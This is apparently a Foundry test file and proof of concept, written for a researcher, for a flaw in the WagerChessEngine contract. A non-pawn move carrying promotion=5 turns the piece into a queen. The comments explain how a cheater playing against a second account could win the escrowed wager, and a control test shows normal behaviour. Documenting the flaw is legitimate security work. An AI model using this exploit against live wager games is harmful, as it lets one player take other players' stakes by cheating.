// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {WagerChessEngine} from "../src/WagerChessEngine.sol";

/// @notice Answers the researcher's question directly: "can I make 2 accounts, play against myself, and see
/// I can spawn queens?" -- YES. This runs the REAL, deployed WagerChessEngine (Monad testnet
/// 0x0b0a6a...f874) with two addresses (alice = white cheater, bob = alice's 2nd account), through
/// the SAME `makeMove` entrypoint the frontend calls. A legal knight move carrying promotion=5
/// spawns a Queen -- no live interaction needed, no one else's funds touched.
contract SelfPlaySpawnQueen is Test {
    WagerChessEngine game;
    address alice = address(0xA11CE); // white -- the cheater
    address bob = address(0xB0B);     // black -- alice's own 2nd account

    function setUp() public {
        game = new WagerChessEngine();
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_TwoAccounts_SpawnQueen_ThroughRealGame() public {
        uint256 wager = 1 ether;

        // 1) Alice opens a wagered game vs Bob (her 2nd account), staking 1 ETH.
        vm.prank(alice);
        uint256 gameId = game.createGame{value: wager}(bob);

        // 2) Bob joins, matching -> 2 ETH escrowed (the pot).
        vm.prank(bob);
        game.joinGame{value: wager}(gameId);
        assertEq(address(game).balance, 2 * wager, "both wagers escrowed -- the pot on the line");

        // 3) b1 (square 1) is Alice's white knight (WN = 2).
        assertEq(game.getBoard(gameId)[1], 2, "b1 is a white knight at the start");

        // 4) Alice plays a LEGAL knight move b1 -> c3 (square 18) -- but sets promotion = 5 (Queen).
        //    This is the exact call the frontend makes; only the promotion arg differs on a non-pawn move.
        vm.prank(alice);
        game.makeMove{value: 0.01 ether}(gameId, 1, 18, 5);

        // 5) The knight is now a QUEEN on c3 -- spawned for free, via the real game entrypoint.
        assertEq(game.getBoard(gameId)[18], 5, "the knight became a WHITE QUEEN (WQ=5) -- FREE PROMOTION");
        assertEq(game.getBoard(gameId)[1], 0, "b1 is now empty");

        // Alice can repeat this on every move, build a Queen army, checkmate Bob, and claim the 2-ETH pot.
    }

    function test_Control_NormalClient_PromotionZero_StaysKnight() public {
        uint256 wager = 1 ether;
        vm.prank(alice);
        uint256 gameId = game.createGame{value: wager}(bob);
        vm.prank(bob);
        game.joinGame{value: wager}(gameId);

        // An honest client sends promotion=0 on a knight move -> the knight stays a knight.
        vm.prank(alice);
        game.makeMove{value: 0.01 ether}(gameId, 1, 18, 0);
        assertEq(game.getBoard(gameId)[18], 2, "honest move: the knight stays a knight");
    }
}
